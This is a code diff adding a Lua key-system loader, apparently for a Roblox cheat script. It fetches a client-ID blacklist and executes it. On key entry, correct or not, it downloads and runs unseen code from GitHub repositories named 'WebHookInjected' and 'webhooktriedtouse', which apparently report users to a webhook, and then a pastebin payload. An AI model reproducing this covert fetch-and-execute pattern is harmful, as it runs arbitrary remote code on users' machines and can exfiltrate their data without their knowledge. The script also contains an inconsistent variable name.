@@ -1,0 +1,73 @@
+_G.BlackListed = false
+local B = "https://raw.githubusercontent.com/Senpaii4/Blacklistedmen/main/blacklist"
+local HWIDTable = loadstring(game:HttpGet(B,true))()
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+print(HWID)
+for i,v in pairs(HWIDTable) do 
+    if v == HWID then
+        _G.Blacklisted = true
+        print("Blacklisted")
+    end
+end
+print(_G.Blacklisted)
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vozoid/ui-libraries/main/drawing/void/source.lua"))()
+local S = "https://pastebin.com/raw/8K62fHBc"
+local key = game:HttpGet(S,true)
+local main = library:Load{
+    Name = "Laby Lua - Key System",
+    SizeX = 350,
+    SizeY = 300,
+    Theme = "Midnight",
+    Extension = "json", -- config file extension
+    Folder = "LabyLuaKey" -- config folder name
+}
+if _G.Blacklisted == true then
+library:Unload()
+else
+
+local tab = main:Tab("Tab")
+
+local section = tab:Section{
+    Name = "Key",
+    Side = "Left"
+}
+
+local section2 = tab:Section{
+    Name = "Discord",
+    Side = "Right"
+}
+
+section2:Button{
+    Name = "Close GUI",
+    Callback  = function()
+        library:Unload()
+    end
+}
+
+_G.Ker = "Try"
+
+local box = section:Box{
+    Name = "Key",
+    Placeholder = "Enter Key",
+    Flag = "KeyBox1",
+    Callback = function(text) 
+        _G.Ker = text
+        print("Boy Entered as key -  " .. text)
+    end
+}
+
+section:Button{
+    Name = "Use Key",
+    Callback  = function()
+        if string.find(_G.Ker,key) then
+            print("Whitelisted")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Senpaii4/WebHookInjected/main/YES",true))()
+            library:Unload()
+            loadstring(game:HttpGet("https://pastebin.com/raw/bjsNyuyg",true))()
+    else
+        print("Wrong Key not whitelisted")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Senpaii4/webhooktriedtouse/main/YEs",true))()
+        end  
+      end
+}
+end
